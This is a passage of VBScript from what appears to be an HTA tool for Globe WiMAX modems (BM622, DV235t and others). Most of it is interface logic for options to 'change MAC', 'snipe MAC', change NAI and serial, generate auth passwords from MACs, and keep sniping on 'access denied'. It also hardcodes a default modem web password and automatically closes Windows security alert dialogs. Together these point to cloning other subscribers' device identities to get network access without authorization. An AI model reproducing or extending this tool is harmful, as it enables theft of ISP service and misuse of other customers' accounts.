Set sSuccessString = Nothing 
Set sReadAll = Nothing
End Function
Sub bm622limitReboot
If radiobtnBm622.Checked Then
Hidebm622OptionRestore
'radioBtnReboot.Checked = False
'radioBtnRestore.Checked = True
'chkBxStableMAC.Checked = False
'EnableFusion
'MsgBox "This option is NOT YET available for Bm622"
Else
Hidebm622OptionRestore
End If 
End Sub
''bm622limitRebootSnipe
Sub bm622limitRebootSnipe
If radiobtnBm622.Checked Then
SnipeMacOptionReboot.Checked = False
SnipeMacOptionRestore.Checked = True
MsgBox "This option is NOT YET available for Bm622"
Else
'	Hidebm622OptionRestore
End If 
End Sub
''END bm622limitRebootSnipe
Function ChangingMacButtonOption
Dim result
For Each changeOptionRadioBtn in ChangeMacOption
If changeOptionRadioBtn.Checked Then
'Msgbox "You selected " & changeOptionRadioBtn.Value & "."
If changeOptionRadioBtn.Value = "REBOOT" Then
''if bm622
bm622limitReboot
''end bm622   
UnHideSecurityElements
result = changeOptionRadioBtn.Value
'Msgbox "You selected " & changeOptionRadioBtn.Value & "."
Else
'Msgbox "You selected " & changeOptionRadioBtn.Value & "."
''if bm622
If radiobtnBm622.Checked Then
UnHidebm622OptionRestore
Else
Hidebm622OptionRestore
End If 
'end bm622
HideSecurityElements
result = changeOptionRadioBtn.Value
End If
End If
Next
ChangingMacButtonOption = result
End Function
Sub UnHideSecurityElements
hideSecurity.style.display = ""
End Sub
Sub HideSecurityElements
hideSecurity.style.display = "none"
End Sub
''bm622restore
Sub UnHidebm622OptionRestore
bm622OptionRestore.style.display = ""
End Sub
Sub Hidebm622OptionRestore
bm622OptionRestore.style.display = "none"
End Sub
''start of hide/unhide options of generate/snipe mac
''begin changeDevice option
''webuser
Function SelectWebAccountOptionRadioBtnClick
Dim result
For Each SelectWebAccountOptionRadioBtn in SelectWebAccountOptionWebUser
If SelectWebAccountOptionRadioBtn.Checked Then
'Msgbox "You selected " & changeOptionRadioBtn.Value & "."
If SelectWebAccountOptionRadioBtn.Value = "Webuserdef" Then
'UnHideSecurityElements
result = SelectWebAccountOptionRadioBtn.Value
spanRadiobtnWebUserDef.style.background = "Red"
spanRadiobtnWebUserCus.style.background = "Transparent"
inputWebUserUname.Disabled = true
inputWebUserPassowrd.Disabled = True
If radiobtnBm622i2011.checked Or radiobtnBm6222011.checked Or radiobtnBm622m2012.checked Then
inputWebUserUname.value = "user"
inputWebUserPassowrd.value = "0SlO051O"
Else
inputWebUserUname.value = "user"
inputWebUserPassowrd.value = "user"
End if

ElseIf SelectWebAccountOptionRadioBtn.Value = "Webusercus" Then
'HideSecurityElements
result = SelectWebAccountOptionRadioBtn.Value
spanRadiobtnWebUserDef.style.background = "Transparent"
spanRadiobtnWebUserCus.style.background = "Red"
inputWebUserUname.Disabled = false
inputWebUserPassowrd.Disabled = false


'Msgbox "You selected " & SelectDeviceOptionRadioBtn.Value & "."
End If
End If
Next

SelectWebAccountOptionRadioBtnClick = result
End Function
''end webuser
''begin webadmin
Function SelectWebAdminAccountOptionRadioBtnClick
Dim result
For Each SelectWebAdminAccountOptionRadioBtn in SelectWebAccountOptionWebAdmin
If SelectWebAdminAccountOptionRadioBtn.Checked Then
'Msgbox "You selected " & changeOptionRadioBtn.Value & "."
If SelectWebAdminAccountOptionRadioBtn.Value = "Webadmindef" Then
'UnHideSecurityElements
result = SelectWebAdminAccountOptionRadioBtn.Value
spanRadiobtnWebAdminDef.style.background = "Red"
spanRadiobtnWebAdminCus.style.background = "Transparent"
inputWebAdminUname.Disabled = true
inputWebAdminPassowrd.Disabled = True
''If radiobtnBm622i2011.checked Then
inputWebAdminUname.value = "admin"
inputWebAdminPassowrd.value = "[ Forbidden ]"
''Else
''inputWebAdminUname.value = "admin"
''inputWebAdminPassowrd.value = "[ Forbidden ]"
''End if

ElseIf SelectWebAdminAccountOptionRadioBtn.Value = "Webadmincus" Then
'HideSecurityElements
result = SelectWebAdminAccountOptionRadioBtn.Value
spanRadiobtnWebAdminDef.style.background = "Transparent"
spanRadiobtnWebAdminCus.style.background = "Red"
''inputWebAdminPassowrd.value = "[ Forbidden ]"
''f radiobtnBm622i2011.checked Then
''inputWebAdminUname.Disabled = True
''inputWebAdminPassowrd.Disabled = True
''radiobtnWebAdminDef.Checked = True
''radiobtnWebAdminDef.Click
''MsgBox "BM622i 2011: Sorry NOT yet available."
''Else
inputWebAdminUname.Disabled = false
inputWebAdminPassowrd.Disabled = false
''End If
'Msgbox "You selected " & SelectDeviceOptionRadioBtn.Value & "."
End If
End If
Next
SelectWebAdminAccountOptionRadioBtnClick = result
End Function
''end webadmin
Function SelectDeviceOptionRadioBtnClick
Dim result
For Each SelectDeviceOptionRadioBtn in SelectDeviceOption
If SelectDeviceOptionRadioBtn.Checked Then
'Msgbox "You selected " & changeOptionRadioBtn.Value & "."
If SelectDeviceOptionRadioBtn.Value = "BM622" Then
'UnHideSecurityElements
result = SelectDeviceOptionRadioBtn.Value
'MsgBox "You selected " & SelectDeviceOptionRadioBtn.Value & "."
'set to restore radio buttn if bm622
'InputacAddress.style.background = "White"
'MsgBox "toink"
'radiobtnBm622i.Checked = True
''MsgBox "Bm622 LIMITATION: Can only use RESTORE METHOD",64,"BM622 CHANGE MAC/SNIPE OPTION"
spanRadiobtnBm6222011.style.background = "Transparent"
spanRadiobtnBm622.style.background = "Red"
spanRadiobtnBm621.style.background = "Transparent"
spanRadiobtnBm622i.style.background = "Transparent"
spanRadiobtnBm622i2011.style.background = "Transparent"
spanRadiobtnBm622m2012.style.background = "Transparent"
spanRadiobtnDv235tG.style.background = "Transparent"
spanRadiobtnDv235tS.style.background = "Transparent"
btnWebGUI.style.visibility="visible"

ElseIf SelectDeviceOptionRadioBtn.Value = "BM6222011" Then
'HideSecurityElements
result = SelectDeviceOptionRadioBtn.Value
spanRadiobtnBm6222011.style.background = "Red"
spanRadiobtnBm622.style.background = "Transparent"
spanRadiobtnBm621.style.background = "Transparent"
spanRadiobtnBm622i.style.background = "Transparent"
spanRadiobtnBm622i2011.style.background = "Transparent"
spanRadiobtnBm622m2012.style.background = "Transparent"
spanRadiobtnDv235tG.style.background = "Transparent"
spanRadiobtnDv235tS.style.background = "Transparent"
btnWebGUI.style.visibility="hidden"
'Msgbox "You selected " & SelectDeviceOptionRadioBtn.Value & "."

ElseIf SelectDeviceOptionRadioBtn.Value = "BM622i2010" Then
'HideSecurityElements
result = SelectDeviceOptionRadioBtn.Value
spanRadiobtnBm6222011.style.background = "Transparent"
spanRadiobtnBm622.style.background = "Transparent"
spanRadiobtnBm621.style.background = "Transparent"
spanRadiobtnBm622i.style.background = "Red"
spanRadiobtnBm622i2011.style.background = "Transparent"
spanRadiobtnBm622m2012.style.background = "Transparent"
spanRadiobtnDv235tG.style.background = "Transparent"
spanRadiobtnDv235tS.style.background = "Transparent"
btnWebGUI.style.visibility="hidden"
'Msgbox "You selected " & SelectDeviceOptionRadioBtn.Value & "."
ElseIf SelectDeviceOptionRadioBtn.Value = "BM622i2011" Then
'HideSecurityElements
result = SelectDeviceOptionRadioBtn.Value
spanRadiobtnBm6222011.style.background = "Transparent"
spanRadiobtnBm622.style.background = "Transparent"
spanRadiobtnBm621.style.background = "Transparent"
spanRadiobtnBm622i2011.style.background = "Red"
spanRadiobtnBm622m2012.style.background = "Transparent"
spanRadiobtnBm622i.style.background = "Transparent"
spanRadiobtnDv235tG.style.background = "Transparent"
spanRadiobtnDv235tS.style.background = "Transparent"
btnWebGUI.style.visibility="hidden"
'Msgbox "You selected " & SelectDeviceOptionRadioBtn.Value & "."
ElseIf SelectDeviceOptionRadioBtn.Value = "BM621" Then
'HideSecurityElements
result = SelectDeviceOptionRadioBtn.Value
spanRadiobtnBm6222011.style.background = "Transparent"
spanRadiobtnBm622.style.background = "Transparent"
spanRadiobtnBm622i.style.background = "Transparent"
spanRadiobtnBm622i2011.style.background = "Transparent"
spanRadiobtnBm622m2012.style.background = "Transparent"
spanRadiobtnBm621.style.background = "Red"
spanRadiobtnDv235tG.style.background = "Transparent"
spanRadiobtnDv235tS.style.background = "Transparent"
btnWebGUI.style.visibility="hidden"
'Msgbox "You selected " & SelectDeviceOptionRadioBtn.Value & "."
ElseIf SelectDeviceOptionRadioBtn.Value = "BM622m2012" Then
'HideSecurityElements
result = SelectDeviceOptionRadioBtn.Value
snipeDomainDropdwnList.selectedIndex = 0
spanRadiobtnBm6222011.style.background = "Transparent"
spanRadiobtnBm622.style.background = "Transparent"
spanRadiobtnBm622i.style.background = "Transparent"
spanRadiobtnBm622i2011.style.background = "Transparent"
spanRadiobtnBm622m2012.style.background = "Red"
spanRadiobtnBm621.style.background = "Transparent"
spanRadiobtnDv235tG.style.background = "Transparent"
spanRadiobtnDv235tS.style.background = "Transparent"
btnWebGUI.style.visibility="hidden"
'Msgbox "You selected " & SelectDeviceOptionRadioBtn.Value & "."
ElseIf SelectDeviceOptionRadioBtn.Value = "DV235tG" Then
'HideSecurityElements
result = SelectDeviceOptionRadioBtn.Value
snipeDomainDropdwnList.selectedIndex = 0
spanRadiobtnBm6222011.style.background = "Transparent"
spanRadiobtnBm622.style.background = "Transparent"
spanRadiobtnBm622i.style.background = "Transparent"
spanRadiobtnBm622i2011.style.background = "Transparent"
spanRadiobtnBm622m2012.style.background = "Transparent"
spanRadiobtnBm621.style.background = "Transparent"
spanRadiobtnDv235tG.style.background = "Red"
spanRadiobtnDv235tS.style.background = "Transparent"
btnWebGUI.style.visibility="hidden"
'Msgbox "You selected " & SelectDeviceOptionRadioBtn.Value & "."
ElseIf SelectDeviceOptionRadioBtn.Value = "DV235tS" Then
'HideSecurityElements
result = SelectDeviceOptionRadioBtn.Value
snipeDomainDropdwnList.selectedIndex = 0
spanRadiobtnBm6222011.style.background = "Transparent"
spanRadiobtnBm622.style.background = "Transparent"
spanRadiobtnBm622i.style.background = "Transparent"
spanRadiobtnBm622i2011.style.background = "Transparent"
spanRadiobtnBm622m2012.style.background = "Transparent"
spanRadiobtnBm621.style.background = "Transparent"
spanRadiobtnDv235tG.style.background = "Transparent"
spanRadiobtnDv235tS.style.background = "Red"
btnWebGUI.style.visibility="hidden"
''SetDefaultDomainSmart
'Msgbox "You selected " & SelectDeviceOptionRadioBtn.Value & "."
End If
End If
Next
If radiobtnBm622.Checked Then
'select restore on Window_Onload 
'radioBtnRestore.Checked = True
'radioBtnRestore.Click
'radioBtnReboot.Checked = False
'SnipeMacOptionRestore.Checked = False
'SnipeMacOptionRestore.Click
'SnipeMacOptionReboot.Checked = False
radioBtnReboot.Checked = True
radioBtnReboot.Click
radioBtnRestore.Checked = False  
SnipeMacOptionReboot.Checked = True
SnipeMacOptionReboot.Click
SnipeMacOptionRestore.Checked = False 
Else
'select reboot on Window_Onload 
radioBtnReboot.Checked = True
radioBtnReboot.Click
radioBtnRestore.Checked = False  
SnipeMacOptionReboot.Checked = True
SnipeMacOptionReboot.Click
SnipeMacOptionRestore.Checked = False 
End If
SetDefaultDomainSmartGlobe
SelectDeviceOptionRadioBtnClick = result
PopulateWebAccount
End Function
Sub UnHideSecurityElements
hideSecurity.style.display = ""
End Sub
Sub HideSecurityElements
hideSecurity.style.display = "none"
End Sub
Sub CheckRadioBtn
'radiobtnBm622
radiobtnBm622i.Checked = True
radiobtnBm622i.Click
End Sub
Sub EnableFusion
If chkBxStableMAC.Checked Then
inputChangeMacOneStable.Disabled = False
If inputChangeMacOneStable.value = "" Or inputChangeMacOneStable.value = "Enter Stable MAC here" Then
changeMacOneOnly.Disabled = True
btnWebAdmin.Disabled = True
btnWebGUI.Disabled = True
btnSetFrequency.Disabled = True
End If
Else
inputChangeMacOneStable.Disabled = True
inputChangeMacOneStable.value = "Enter Stable MAC here"
inputChangeMacOneStable.style.color = "#000000"
inputChangeMacOneStable.style.background = "White"
inputChangeMacOne.Click
End If
End Sub
''end changeDevice option
Function SnipeMacRadioOption
Dim result
For Each SnipeOptionRadioBtn in SnipeMacOption
If SnipeOptionRadioBtn.Checked Then
'Msgbox "You selected " & changeOptionRadioBtn.Value & "."
If SnipeOptionRadioBtn.Value = "REBOOT" Then
'bm622limitRebootSnipe
UnHideDomainElements
result = SnipeOptionRadioBtn.Value
'Msgbox "You selected " & SnipeOptionRadioBtn.Value & "."
Else
HideDomainElements
result = SnipeOptionRadioBtn.Value
snipeDomainDropdwnList.SelectedIndex = 0
'ClearMacList
'Msgbox "You selected " & SnipeOptionRadioBtn.Value & "."
End If
End If
Next
SnipeMacRadioOption = result
End Function
Sub UnHideDomainElements
'divDomainSnipe.style.display = ""
spanSnipeDomain.style.display = ""
snipeDomainDropdwnList.style.display = ""
chkAllowNaiSnipe.style.display = ""
chkAllowNaiSnipeLabel.style.display = ""
chkEnableTLSSnipe.style.display = ""
chkEnableTLSSnipeLabel.style.display = ""
RestoreOptionSnipeWarning.style.display = "none"
End Sub
Sub HideDomainElements
'divDomainSnipe.style.display = "none"
spanSnipeDomain.style.display = "none"
snipeDomainDropdwnList.style.display = "none"
chkAllowNaiSnipe.style.display = "none"
chkAllowNaiSnipeLabel.style.display = "none"
chkEnableTLSSnipe.style.display = "none"
chkEnableTLSSnipeLabel.style.display = "none"
RestoreOptionSnipeWarning.style.display = ""
End Sub
''end of hid/unide options of generate/snipe mac
''BEGIN GET TOOL PATH
Function GetToolCurrentDirectory
Set FSO = CreateObject("Scripting.FileSystemObject")
currentFolder = FSO.GetParentFolderName(location.pathname)
GetToolCurrentDirectory = currentFolder
Set FSO = Nothing
End Function
''END GET TOOL PATH
'' BEGIN is windows xp
Function IsWindowsXp
result = false
If	InStr(GetOSVersionValue, "Windows XP") <> 0 Then
result = true
Else 
result = false
End If
IsWindowsXp = result
End Function
'' END  is windows xp
Sub TestTSTClose
'	filenameInput =  "TelnetInputCmnd2.txt"
'	tstInputCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameInput)
'	filenameOutPut =  "TelnetOutPutCmnd2.txt"
'	tstLogCmnd = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameOutPut)
'	tsCmnd = "/r:" & Chr(34)& tstInputCmndFile & chr(34) & " /o:" & Chr(34)& tstLogCmnd & chr(34) & " /m"


'	filename = "tst10.exe"
'	currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)	
''
''filenameExitTst = "exitTst102.vbs"
''currentFolderAndFileExitTst = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameExitTst)
''CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFileExitTst & chr(34),0 , False
'	ExecuteDLL "wscript","exitTst102.vbs","closeTST"
''
'	CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmnd,0 , True	
'	Exit Sub
End Sub
''End TestTSTClose
''
''
Function checkPreviousMACtestedDv235tOnly(currentMAc)
checkMactest = False
If currentMAc = previousTestedMAC.value Then
checkMactest = True
End If
checkPreviousMACtestedDv235tOnly = checkMactest
End Function

Sub ShutdownPC
''Exit Sub
''
'		CreateObject("Wscript.Shell").Run("Shutdown.hta")
'		Self.close
''MsgBox IsWindowsXp
'		CloseUsedWindows
'		RunUpdater22i2011
filename = "Shutdown.hta"
Set objShell = CreateObject("Shell.Application")
currentFolder = GetToolCurrentDirectory
currentWorkingFolder = ReplaceWithSpace (GetToolCurrentDirectory)
currentFolderAndFile = ReplaceWithSpace(Chr(34)& GetToolCurrentDirectory &"\" &filename & chr(34))
If IsWindowsXp Then
''MsgBox currentFolderAndFile

objShell.ShellExecute "mshta", currentFolderAndFile, currentWorkingFolder, "", 1
Else
''MsgBox "windows 7 only this"
objShell.ShellExecute "mshta", currentFolderAndFile, currentWorkingFolder, "runas", 1
End If
createTxtLogError "Auto Shutdown PC executed...."
Sleeper 2000
Self.close
''
End Sub
''Begin ExecuteFile
Sub ExecuteFile(filename)
Set objShell = CreateObject("Shell.Application")
currentFolder = GetToolCurrentDirectory
currentWorkingFolder = ReplaceWithSpace (GetToolCurrentDirectory)
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)

If IsWindowsXp Then
''MsgBox currentFolderAndFile
objShell.ShellExecute currentFolderAndFile,"", currentWorkingFolder, "", 1
Else
''MsgBox "windows 7 only this"
objShell.ShellExecute currentFolderAndFile,"", currentWorkingFolder, "runas", 1
End If
End Sub
''End ExecuteFile
''Begin ExecuteFile
Sub ExecuteDLL(executableFile,filename,modeString)
Set objShell = CreateObject("Shell.Application")
currentFolder = GetToolCurrentDirectory
currentWorkingFolder = ReplaceWithSpace (GetToolCurrentDirectory)


If modeString = "install" Then
currentFolderAndFile = ReplaceWithSpace(Chr(34)& GetToolCurrentDirectory &"\" &filename & chr(34))
If IsWindowsXp Then
''MsgBox currentFolderAndFile
objShell.ShellExecute executableFile, currentFolderAndFile, currentFolder, "", 1
Else
''MsgBox "windows 7 only this"
objShell.ShellExecute executableFile, currentFolderAndFile, currentFolder, "runas", 1
End If


ElseIf modeString = "uninstall" Then
currentFolderAndFile =  ReplaceWithSpace(Chr(34)& GetToolCurrentDirectory &"\" &filename & chr(34) &" /u")
If IsWindowsXp Then
''MsgBox currentFolderAndFile
objShell.ShellExecute executableFile, currentFolderAndFile, currentFolder, "", 1
Else
''MsgBox "windows 7 only this"
objShell.ShellExecute executableFile, currentFolderAndFile, currentFolder, "runas", 1
End If
ElseIf modeString = "testPlugin" Then

currentFolderAndFile = ReplaceWithSpace(Chr(34)& GetToolCurrentDirectory &"\" &filename & chr(34))
If IsWindowsXp Then
''MsgBox currentFolderAndFile
objShell.ShellExecute executableFile, currentFolderAndFile, currentFolder, "", 0
Else
''MsgBox "windows 7 only this"
objShell.ShellExecute executableFile, currentFolderAndFile, currentFolder, "runas", 0

End If
ElseIf modeString = "closeTST" Then

currentFolderAndFile = ReplaceWithSpace(Chr(34)& GetToolCurrentDirectory &"\" &filename & chr(34))
If IsWindowsXp Then
''MsgBox currentFolderAndFile
objShell.ShellExecute executableFile, currentFolderAndFile, currentFolder, "", 0
Else
''MsgBox "windows 7 only this"
objShell.ShellExecute executableFile, currentFolderAndFile, currentFolder, "runas", 0

End If
End If
Set objShell = Nothing
End Sub
''End ExecuteFile
''Begin ExecuteSleeperVBS
''ExecuteSleeperVbs "cscript",filename,MSecs,"sleeperFile"
Sub ExecuteSleeperVbs(executableFile,filename,sleepTime,modeString)
Set objShell = CreateObject("Shell.Application")
currentFolder = GetToolCurrentDirectory
currentWorkingFolder = ReplaceWithSpace (GetToolCurrentDirectory)

If modeString = "sleeperFile" Then

''currentFolderAndFile = ReplaceWithSpace(Chr(34)& GetToolCurrentDirectory &"\" &filename & chr(34))
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If IsWindowsXp Then
''MsgBox currentFolderAndFile
objShell.ShellExecute executableFile, currentFolderAndFile & " " & sleepTime, currentWorkingFolder, "", 0
Else
''MsgBox "windows 7 only this"
DisplayLogIpscan executableFile & currentFolderAndFile & " " & sleepTime
objShell.ShellExecute executableFile, Chr(34)& currentFolderAndFile & Chr(34) & " " & sleepTime, currentWorkingFolder, "runas", 0
End If
End If 
End Sub
''End ExecuteSleeperVBS

''Begin Replace With Space
Function ReplaceWithSpace (textString)
Set re = New RegExp
re.IgnoreCase= True
re.Global = True
re.Pattern = "%20"
ReplaceWithSpace = re.Replace(textString, " ")
End Function
''End Replace With Space
''Begin Close WindowUsed
Sub CloseUsedWindows
Set oAutoIt = CreateObject("AutoItX3.Control")
oAutoIt.WinClose "GLOBE WIMAX UPGRADE", ""
Sleeper 500
oAutoIt.WinClose "Windows Security Alert", ""
Sleeper 500
oAutoIt.WinClose "Program Compatibility Assistant", ""
''oAutoIt = Nothing
End Sub
''End Close WindowsUsed
''Begin RUN UPdater
Sub RunUpdater22i2011_ForTest
ExecuteFile "BM622i_V100R001PHLC08B029PST03.exe"

End Sub
Sub RunUpdater22i2011
Set oAutoIt = CreateObject("AutoItX3.Control")
'		CreateObject("Wscript.Shell").Run("BM622i_V100R001PHLC08B029PST03.exe")
'		Sleeper 40000
'		oAutoIt.WinKill "GLOBE WIMAX UPGRADE", ""
'		DisplayLogChangeMAConly("Closing UPGRADER....... ")
'		Sleeper 1000
'Set FSO = CreateObject("Scripting.FileSystemObject")
'currentFolder = FSO.GetParentFolderName(location.pathname)
'currentFolderAndFile = Chr(34) &currentFolder &"\BM622i_V100R001PHLC08B029PST03.exe" & chr(34)
'currentFolderAndFile1 = "C:\Documents and Settings\Nay\My Documents\Downloads\622and622iV1eBETA\win7fix\622and622iV1eBETA\622and622iV1eBETA\622and622iV1d\BM622i_V100R001PHLC08B029PST03.exe"
'Set objShell = CreateObject("Shell.Application")
'currentWorkingFolder  = chr(34) &currentFolder  & chr(34)

''currentFolderAndFile  = chr(34) &currentFolderAndFile  & chr(34)
''MsgBox currentFolderAndFile
'MsgBox currentFolderAndFile1

''objShell.ShellExecute currentFolder &"\BM622i_V100R001PHLC08B029PST03.exe", "", currentFolder, "runas", 1
'objShell.ShellExecute currentFolderAndFile,"", "", "", 1
ExecuteFile "BM622i_V100R001PHLC08B029PST03.exe"
Sleeper 40000
''oAutoIt.WinKill "GLOBE WIMAX UPGRADE", ""
oAutoIt.WinClose "GLOBE WIMAX UPGRADE", ""

If Not IsWindowsXp Then
checkCount = 0
checkAssistant = 0

Do
checkCount = checkCount + 1
'checkAssistant = oAutoIt.WinExists "Program Compatibility Assistant", ""
Sleeper 1000
''Exit Sub
If oAutoIt.WinExists("Program Compatibility Assistant", "")  Then
oAutoIt.WinClose "Program Compatibility Assistant", ""
Exit Do
End If 
If checkCount = 10 Then
Exit Do
End If
Loop While checkAssistant = 0
Else
checkCount = 0
checkAssistant = 0

Do
checkCount = checkCount + 1
'checkAssistant = oAutoIt.WinExists "Program Compatibility Assistant", ""
Sleeper 1000
''Exit Sub
If oAutoIt.WinExists("Windows Security Alert", "")  Then
oAutoIt.WinClose "Windows Security Alert", ""
Exit Do
End If 
If checkCount = 10 Then
Exit Do
End If
Loop While checkAssistant = 0

End If
CloseUsedWindows
End Sub
''END RunUpdater orig
Sub KillInternetExplorer
Set oAutoIt = CreateObject("AutoItX3.Control")
oAutoIt.Sleep 500
'oAutoIt.ProcessClose "IEXPLORE.EXE"
'oAutoIt.Sleep 500
''
existProcessKill = 0
Do
existProcessKill = oAutoIt.ProcessExists ("IEXPLORE.EXE")
If existProcessKill > 0 Then
oAutoIt.ProcessClose "IEXPLORE.EXE"
existProcessKill = 1
oAutoIt.Sleep 500
End If
Loop While existProcessKill > 0
''
End Sub
Sub KillNotepad
Set oAutoIt = CreateObject("AutoItX3.Control")
Sleeper 500
oAutoIt.ProcessClose "NOTEPAD.EXE"
Sleeper 500
End Sub
''End RUN UPdater
Sub ViewErrorLog
Dim objFSO,textFilePath
'	const ForAppending = 8

filename = "txtLogError.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
textFilePathRun = ReplaceWithSpace(Chr(34)& GetToolCurrentDirectory &"\" &filename & chr(34))
set objFSO = createobject("Scripting.FileSystemObject")
If (objFSO.FileExists(textFilePath)) Then 
If objFSO.GetFile(textFilePath).size <> 0 then
''CreateObject("Wscript.Shell").Run "%comspec% /c Start Notepad " & textFilePath, 0, 1
CreateObject("Wscript.Shell").Run "%comspec% /c Start Notepad " & textFilePathRun, 0, 1
''ExecuteFile textFilePath
Else
MsgBox "Good News! Log file is empty.", 0,"Error message"
End If
Else 
'If objFSO.GetFile(textFilePath).size <> 0 then
MsgBox "Good News! No error log was found.", 0,"Error message"
'End if
End If
Set textFilePath = Nothing
Set objFSO = Nothing
End Sub
Sub GetOSVersion
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer &  "\root\cimv2")
Set colOperatingSystems = objWMIService.ExecQuery _
("Select * from Win32_OperatingSystem")
For Each objOperatingSystem in colOperatingSystems
Msgbox objOperatingSystem.Caption & " " & _
objOperatingSystem.Version
Next
End Sub
''BEGIN GET OS version FUNCTION
Function GetOSVersionValue
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer &  "\root\cimv2")
Set colOperatingSystems = objWMIService.ExecQuery _
("Select * from Win32_OperatingSystem")
For Each objOperatingSystem in colOperatingSystems
'Msgbox objOperatingSystem.Caption & " " & _
'objOperatingSystem.Version
osVersion = objOperatingSystem.Caption
Next
GetOSVersionValue = osVersion
End Function
''END
Sub GetChkAllowNai
If chkAllowNai.Checked Then
document.all.chkAllowNaiLabel.style.background = "Red"
Msgbox "Changing NAI is ENABLED.", 64+4096 , "NAI Settings"
Else
document.all.chkAllowNaiLabel.style.background = ""
Msgbox "Changing NAI is DISABLED." , 64+4096 , "NAI Settings"
End If
End Sub
''
Sub GetChkEnable622mType
If radiobtnDv235tS.checked Then
MsgBox "SORRY this option is NOT available for DV235t SMART!!!",16+4096 ,"NOT AVAILABLE!!!"
chkEnable622mType.Checked = True
Exit sub
End If
If chkEnable622mType.Checked Then
document.all.chkEnable622mTypeLabel.style.background = "Red"
GetPassAndDomainPass
Msgbox "AUTH GEN for OLD type MAC is ENABLED." & vbCr & vbLf & vbCr & vbLf & "(BM622, BM622i, BM625, BM621)", 64+4096 , "PASS GEN, MAC series type."
Else
document.all.chkEnable622mTypeLabel.style.background = ""
GetPassAndDomainPass
Msgbox "AUTH GEN for 622m type MAC is ENABLED." & vbCr & vbLf  & vbCr & vbLf & "(BM622m 2012-13)" , 64+4096 , "PASS GEN, MAC series type."
End If
End Sub
''
Sub GetChkAllowNaiSnipe
If chkAllowNaiSnipe.Checked Then
document.all.chkAllowNaiSnipeLabel.style.background = "Red"
Msgbox "Changing NAI is ENABLED." , 64+4096 , "Snipe NAI Settings"
Else
document.all.chkAllowNaiSnipeLabel.style.background = ""
Msgbox "Changing NAI is DISABLED." , 64+4096 , "Snipe NAI Settings"
End If
End Sub
Sub GetChkAllowNaiDef
If chkAllowNaiDef.Checked Then
document.all.chkAllowNaiLabelDef.style.background = "Red"
Msgbox "Changing NAI is ENABLED.", 64+4096 , "NAI Settings"
Else
document.all.chkAllowNaiLabelDef.style.background = ""
Msgbox "Changing NAI is DISABLED." , 64+4096 , "NAI Settings"
End If
End Sub
Sub GeChkEnableRestoreDefalutMac
If chkEnableRestoreDefalutMac.Checked Then
If btnChangeMacDefault.Disabled = True Then
Msgbox "You did NOT yet SET and SAVE your DEFAULT MAC!!!." & vbCr & vbLf & "Please got to Tool Settings >> Web / Extra Settings.", 64+4096 , "Error Message...."
chkEnableRestoreDefalutMac.Checked = False
Exit Sub
End If
document.all.chkEnableRestoreDefalutMacLabel.style.background = "Red"
Msgbox "Restore Default MAC after scan is ENABLED.", 64+4096 , "Restore Default MAC ENABLED"
Else
document.all.chkEnableRestoreDefalutMacLabel.style.background = ""
Msgbox "Restore Default MAC after scan is DISABLED." , 64+4096 , "Restore Default MAC DISABLED"
End If
End Sub
''
Sub GeChkEnablePersistentSnipe
If chkEnablePersistentSnipe.Checked Then
document.all.chkEnablePersistentSnipeLabel.style.background = "Red"
Msgbox "Continue SNIPE on ACCESS denied ERROR is ENABLED.", 64+4096 , "Continue SNIPE on ACCESS DENIED ENABLED"
Else
document.all.chkEnablePersistentSnipeLabel.style.background = ""
Msgbox "Continue SNIPE on ACCESS denied ERROR is DISABLED." , 64+4096 , "Continue SNIPE on ACCESS DENIED DISABLED"
End If
End Sub
''
Sub GeChkEnableSmsSnipe
If chkEnableSmsSnipe.Checked Then
Msgbox "THIS is BETA only! Its NOT accurate. Powered By: http://txtmyt.org/.", 64+4096 , "SMS/Text NOTIFICATION MESSAGE...."
document.all.chkEnableSmsSnipeLabel.style.background = "Red"
Msgbox "Live MAC SMS/Text Notification is ENABLED.", 64+4096 , "SMS/Text Notification is ENABLED"
Else
document.all.chkEnableSmsSnipeLabel.style.background = ""
Msgbox "Live MAC SMS/Text Notification is DISABLED." , 64+4096 , "SMS/Text Notification is DISABLED"
End If
End Sub
''
''
Sub EnableDisableChangeSerial
If radiobtnBm6222011.checked Then
If chkEnableChangeSerial.Checked Then
document.all.chkChangeSerialLabel.style.background = "Red"
Msgbox "Change Serial is ENABLED.", 64+4096 , "Change Serial ENABLED"
Else
document.all.chkChangeSerialLabel.style.background = ""
Msgbox "Change Serial is DISABLED." , 64+4096 , "Change Serial DISABLED"
End If
Else
chkEnableChangeSerial.Checked = False
MsgBox "Change SERIAL on this DEVICE is NOT yet supported!!!", 64+4096 , "Error Message...."
End If
End Sub
''
''
Sub GeChkEnableTLS
If chkEnableTLS.Checked Then
document.all.chkEnableTLSLabel.style.background = "Red"
Msgbox "TLS authentication is ENABLED.TTLS disabled.", 64+4096 , "TLS authentication ENABLED"
Else
document.all.chkEnableTLSLabel.style.background = ""
Msgbox "TLS authentication is DISABLED.TTLS enabled." , 64+4096 , "TLS authentication DISABLED"
End If
End Sub
Sub GeChkEnableTLSSnipe
If chkEnableTLSSnipe.Checked Then
document.all.chkEnableTLSSnipeLabel.style.background = "Red"
Msgbox "TLS authentication is ENABLED.TTLS disabled.", 64+4096 , "TLS authentication ENABLED"
Else
document.all.chkEnableTLSSnipeLabel.style.background = ""
Msgbox "TLS authentication is DISABLED.TTLS enabled." , 64+4096 , "TLS authentication DISABLED"
End If
End Sub
Sub GeChkEnableTLSDef
If chkEnableTLSDef.Checked Then
document.all.chkEnableTLSLabelDef.style.background = "Red"
Msgbox "TLS authentication is ENABLED.TTLS disabled.", 64+4096 , "TLS authentication ENABLED"
Else
document.all.chkEnableTLSLabelDef.style.background = ""
Msgbox "TLS authentication is DISABLED.TTLS enabled." , 64+4096 , "TLS authentication DISABLED"
End If
End Sub
Sub GeChkEnableRestore
If chkEnableRestore.Checked Then
document.all.chkEnableLabelRestore.style.background = "Red"
